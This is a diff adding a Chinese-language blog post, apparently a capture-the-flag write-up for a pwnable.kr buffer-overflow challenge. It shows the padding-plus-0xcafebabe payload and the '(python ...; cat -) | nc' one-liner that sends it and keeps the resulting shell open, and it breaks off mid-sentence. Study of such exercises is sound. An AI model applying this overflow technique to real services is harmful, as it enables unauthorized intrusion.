@@ -1,0 +1,56 @@
+#+STARTUP: showall
+#+STARTUP: hidestars
+#+OPTIONS: H:2 num:nil tags:nil toc:nil timestamps:t
+#+LAYOUT: post
+#+AUTHOR: tiankai
+#+DATE: 2015-09-14 Mon 22:55
+#+TITLE: 构造缓冲区溢出字符串的一种方式
+#+DESCRIPTION: stack overflow 字符串 
+#+TAGS: pwn
+#+CATEGORIES: 技术
+
+* 背景
+最近在做http://pwnable.kr/ 上面的溢出题目碰到了几个使用字符串然后进行溢出的题目,一开始遇到的时候,
+知道输入的字符串是什么,到时就是不知道怎么构造,后来看到网上的分析才知道,原来字符串的输入方式是很有讲究的,
+所以通过这篇文章记录一下.
+
+* 通过python构造溢出性字符串
+通过逆向分析,现在已经基本的知道了我们需要构造的溢出字符串的类型,就是前面52个填充型的字符串,然后后面跟着
+"cafebabe"的小端写法,我们要发给的远程的计算机,通过nc进行连接:
+#+begin_src bash
+nc pwnable.kr 9000
+#+end_src
+所以我们想办法要将溢出的字符串直接传递给完成服务器,并且还是要以可见字符的形式,尤其是"cafebabe"要以字符串的
+形式表现出来.
+因为时字符串溢出,只能输入字符串,系统接受到字符,其实就是该字符的ASCII码,但是ASCII码会有很大的局限性,ascii码
+的可见字符串的表现范围是:0x21~0x7e,还有大量的值是无法使用.这就要求我们不能使用普通的字符串,幸好我们有了python.
+
+python中可以使用"\x+编码"的形式,直接表示字符串,也可以表示不可见字符串.
+例如:
+#+begin_example
+\xbe\xba\xfe\xca 表示:cafebabe的字符串格式
+#+end_example
+通过上面的表示我们就可以很简单的表示特定编码的字符串了.
+这时我们构造的字符串如下:
+#+begin_example
+python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'
+#+end_example
+但是要怎么传输给远程服务器呢,如果直接先的格式是不行的.
+#+begin_example
+python -c 'print "A"*52 + "\xbe\xba\xfe\xca"' | nc pwnable.kr 9000
+python -c 'print "A"*52 + "\xbe\xba\xfe\xca"' > nc pwnable.kr 9000
+#+end_example
+上面的命令都是不能成功的,这说明上面的重定位都是不对,都没有将我们构造的字符串输入到远程的服务器上去.
+
+* 正确的输入方式
+通过查找资料,发现正确的查找方式如下所示;
+#+begin_src bash
+(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
+#+end_src
+其中使用了4条命令;
+1. (python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"' :打印字符串
+2. cat - :输出stdin中的数据
+3. | :管道,上一个的输出作为下一个的输入
+4. nc pwnable.kr 9000 :和远程服务器进行通信.
+通过上面的命令就可以
+
